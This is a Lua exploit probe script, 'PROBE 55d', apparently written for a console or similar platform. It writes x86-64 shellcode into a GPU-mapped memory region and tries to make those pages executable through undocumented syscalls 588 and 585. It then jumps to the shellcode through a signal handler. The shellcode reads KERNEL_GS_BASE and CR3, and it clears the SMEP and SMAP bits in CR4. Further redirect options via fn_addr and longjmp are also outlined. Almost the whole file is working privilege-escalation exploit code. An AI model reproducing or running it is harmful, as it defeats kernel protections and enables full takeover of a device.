-- CRASH_CLASS: HIGH
-- PROBE 55d: RWX shellcode execution via sys 588 DMEM page flip
--
-- Prerequisites: 54d showed sys 588 can change page attributes
-- Strategy:
--   1. Allocate GPU mmap region (RW)
--   2. Write x86-64 shellcode into it
--   3. Use sys 588 to flip pages to executable (RX or RWX)
--   4. Find a jump primitive to reach our shellcode
--   5. Shellcode reads kernel state (GS_BASE, CR3, CR4)

print("=== PROBE 55d: RWX SHELLCODE EXECUTION ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function hexval(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X_%08X", h, l)
end
local function signed32(v)
    if type(v) == "table" and v.h then
        if v.h == 0xFFFFFFFF then return v.l - 0x100000000 end
        if v.h == 0 and v.l >= 0x80000000 then return v.l - 0x100000000 end
    end
    local n = to_num(v)
    if n >= 0x80000000 and n < 0x100000000 then return n - 0x100000000 end
    return n
end

local sc_mmap = make_syscall(477)
local sc588 = make_syscall(588)
local sc585 = make_syscall(585)  -- mtype_protect

-- ============================================================
-- Phase 1: Allocate GPU mmap region
-- ============================================================
print("[*] Phase 1: Allocate GPU mmap region for shellcode")

local gpu = nil
local gpu_size = 16 * 0x4000  -- 16 pages = 256KB

local ok, val = pcall(function()
    return sc_mmap(uint64(0), uint64(gpu_size), uint64(0x33),
        uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
end)
if ok then
    gpu = val
    print("  GPU mmap at: " .. hexval(gpu))
else
    print("  GPU mmap FAILED: " .. tostring(val))
    print("  Cannot continue without writable memory")
    print("=== PROBE 55d ABORTED ===")
    return
end

-- ============================================================
-- Phase 2: Write shellcode into GPU region
-- ============================================================
print("")
print("[*] Phase 2: Writing shellcode into GPU mmap")

local sc_base = gpu  -- shellcode starts at beginning of GPU region
local result_buf = gpu + 0x1000  -- results stored 4KB later

-- Zero the result buffer
for i = 0, 0xFF, 4 do safe_wd(result_buf + i, 0) end

-- Shellcode 1: Simple test — write magic value and return
-- mov rax, 0x4141414141414141
-- mov [rdi], rax
-- ret
local sc1_bytes = {
    0x48, 0xB8, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,  -- mov rax, 0x4141...
    0x48, 0x89, 0x07,                                                -- mov [rdi], rax
    0xC3                                                              -- ret
}

-- Shellcode 2: Read KERNEL_GS_BASE via RDMSR
-- mov ecx, 0xC0000102   ; KERNEL_GS_BASE MSR
-- rdmsr
-- shl rdx, 32
-- or rax, rdx
-- mov [rdi], rax
-- ret
local sc2_bytes = {
    0xB9, 0x02, 0x01, 0x00, 0xC0,       -- mov ecx, 0xC0000102
    0x0F, 0x32,                           -- rdmsr
    0x48, 0xC1, 0xE2, 0x20,             -- shl rdx, 32
    0x48, 0x09, 0xD0,                    -- or rax, rdx
    0x48, 0x89, 0x07,                    -- mov [rdi], rax
    0xC3                                  -- ret
}

-- Shellcode 3: Read CR3 (page table base) — ring 0 only
-- mov rax, cr3
-- mov [rdi], rax
-- ret
local sc3_bytes = {
    0x0F, 0x20, 0xD8,   -- mov rax, cr3
    0x48, 0x89, 0x07,   -- mov [rdi], rax
    0xC3                 -- ret
}

-- Shellcode 4: Read CR4 and clear SMEP bit (bit 20) — ring 0 only
-- mov rax, cr4
-- mov [rdi], rax        ; save original CR4
-- btr rax, 20           ; clear SMEP
-- btr rax, 21           ; clear SMAP
-- mov cr4, rax
-- mov [rdi+8], rax      ; save new CR4
-- ret
local sc4_bytes = {
    0x0F, 0x20, 0xE0,           -- mov rax, cr4
    0x48, 0x89, 0x07,           -- mov [rdi], rax
    0x0F, 0xBA, 0xF0, 0x14,    -- btr rax, 20 (SMEP)
    0x0F, 0xBA, 0xF0, 0x15,    -- btr rax, 21 (SMAP)
    0x0F, 0x22, 0xE0,           -- mov cr4, rax
    0x48, 0x89, 0x47, 0x08,    -- mov [rdi+8], rax
    0xC3                         -- ret
}

-- Write all shellcodes at different offsets within the GPU page
local shellcodes = {
    {offset=0x000, bytes=sc1_bytes, name="magic_write"},
    {offset=0x040, bytes=sc2_bytes, name="read_gs_base"},
    {offset=0x080, bytes=sc3_bytes, name="read_cr3"},
    {offset=0x0C0, bytes=sc4_bytes, name="disable_smep"},
}

for _, sc in ipairs(shellcodes) do
    local addr = sc_base + sc.offset
    for i, b in ipairs(sc.bytes) do
        local byte_addr = addr + (i - 1)
        -- Write byte-by-byte using dword writes (aligned)
        local dword_addr = byte_addr - (byte_addr % 4)
        local existing = safe_rd(dword_addr) or 0
        local byte_offset = (byte_addr % 4) * 8
        local mask = 0xFF * (2 ^ byte_offset)
        existing = (existing & (~mask & 0xFFFFFFFF)) | (b * (2 ^ byte_offset))
        safe_wd(dword_addr, existing)
    end
    -- Verify first bytes
    local verify = safe_rd(addr)
    print(string.format("  %s at +0x%03X: first dword = 0x%08X", sc.name, sc.offset, verify or 0))
end

-- ============================================================
-- Phase 3: Attempt page attribute flip via sys 588
-- ============================================================
print("")
print("[*] Phase 3: Flip GPU pages to executable via sys 588")

local attr_struct = memory.alloc(0x40)

-- Try multiple protection value encodings
-- From 54d results, fill in whichever succeeded
local prot_attempts = {
    -- {struct_layout, description}
    {function()
        for i = 0, 0x1F, 4 do safe_wd(attr_struct + i, 0) end
        safe_wd(attr_struct, 0x07)  -- RWX at offset 0
    end, "prot=7 at +0"},
    {function()
        for i = 0, 0x1F, 4 do safe_wd(attr_struct + i, 0) end
        safe_wd(attr_struct, 0x05)  -- RX at offset 0
    end, "prot=5 at +0"},
    {function()
        for i = 0, 0x1F, 4 do safe_wd(attr_struct + i, 0) end
        safe_wd(attr_struct + 8, 0x07)  -- RWX at offset 8
    end, "prot=7 at +8"},
    {function()
        for i = 0, 0x1F, 4 do safe_wd(attr_struct + i, 0) end
        safe_wd(attr_struct, 0x37)  -- 0x33 | EXEC
    end, "prot=0x37 at +0"},
}

local flip_ok = false
for _, attempt in ipairs(prot_attempts) do
    attempt[1]()  -- set up struct

    local ok2, ret2 = pcall(function()
        return sc588(gpu, uint64(0x4000), uint64(attr_struct))
    end)
    if ok2 then
        local rv = signed32(ret2)
        print(string.format("  588(gpu, 0x4000, {%s}) = %d", attempt[2], rv))
        if rv == 0 then
            print("  >>> PAGE FLIP SUCCEEDED!")
            flip_ok = true
            break
        end
    else
        print(string.format("  588({%s}) CRASHED", attempt[2]))
    end
end

-- Also try sys 585 mtype_protect
if not flip_ok then
    print("")
    print("  Trying sys 585 mtype_protect as fallback...")
    -- mtype_protect(addr, len, prot)
    local prot_vals = {0x05, 0x07, 0x04}
    for _, pv in ipairs(prot_vals) do
        local ok2, ret2 = pcall(function()
            return sc585(gpu, uint64(0x4000), uint64(pv))
        end)
        if ok2 then
            local rv = signed32(ret2)
            print(string.format("  585(gpu, 0x4000, 0x%X) = %d", pv, rv))
            if rv == 0 then
                print("  >>> mtype_protect SUCCEEDED!")
                flip_ok = true
                break
            end
        end
    end
end

-- ============================================================
-- Phase 4: Jump primitives
-- ============================================================
print("")
print("[*] Phase 4: Finding a jump primitive")

-- Option A: signal handler + sigreturn with modified RIP
-- sigaction(SIGUSR1, handler=shellcode_addr, ...)
-- then raise(SIGUSR1)
print("  Option A: sigaction + raise")
local sc340 = make_syscall(340)  -- sigaction
local sc37  = make_syscall(37)   -- kill (to send signal to self)
local sc20  = make_syscall(20)   -- getpid

local pid = 0
do
    local ok2, ret2 = pcall(function() return sc20() end)
    if ok2 then pid = to_num(ret2) end
end

if flip_ok then
    -- Set up sigaction struct for SIGUSR1 (signal 30)
    local sa = memory.alloc(0x40)
    for i = 0, 0x3F, 4 do safe_wd(sa + i, 0) end
    -- sa_handler at +0 = shellcode address
    safe_wq(sa, sc_base)  -- point to our shellcode

    local ok2, ret2 = pcall(function()
        return sc340(uint64(30), uint64(sa), uint64(0))  -- SIGUSR1=30
    end)
    if ok2 then
        print("  sigaction(SIGUSR1, shellcode) = " .. signed32(ret2))
        if signed32(ret2) == 0 then
            print("  Sending SIGUSR1 to self (pid=" .. pid .. ")...")
            local ok3, ret3 = pcall(function()
                return sc37(uint64(pid), uint64(30))
            end)
            if ok3 then
                print("  kill() = " .. signed32(ret3))
                -- Check if shellcode wrote magic value
                local magic = safe_rq(result_buf)
                print("  Result buffer: " .. hexval(magic))
                if magic then
                    local h, l = get_hi_lo(magic)
                    if h == 0x41414141 and l == 0x41414141 then
                        print("  >>>>>> SHELLCODE EXECUTED! <<<<<<")
                    elseif h >= 0xFFFF8000 and h < 0xFFFFFFFF then
                        print("  >>> KERNEL POINTER: " .. hexval(magic))
                        print("  >>> Could be GS_BASE or CR3!")
                    end
                end
            else
                print("  kill() crashed: " .. tostring(ret3))
            end
        end
    else
        print("  sigaction crashed: " .. tostring(ret2))
    end
else
    print("  [SKIP] Page flip didn't succeed — no executable shellcode")
end

-- Option B: Loader metadata fn_addr (if 45c was wrong about independence)
print("")
print("  Option B: Loader fn_addr redirect (speculative)")
local pipe_str = tostring(syscall.pipe)
local fn_str = pipe_str:match("fcall_stub%.fn_addr: (0x[0-9a-fA-F]+)")
if fn_str then
    print("  fn_addr location: " .. fn_str)
    print("  If fn_addr controls dispatch, writing shellcode addr here")
    print("  would redirect next syscall. BUT 45c suggests independence.")
    print("  Try only as last resort.")
end

-- Option C: longjmp with crafted jmp_buf
print("")
print("  Option C: longjmp trick")
print("  Find longjmp in eboot, craft jmp_buf with RIP=shellcode")
print("  This requires eboot gadget addresses from dynlib_get_info")

print("")
print("=== PROBE 55d COMPLETE ===")
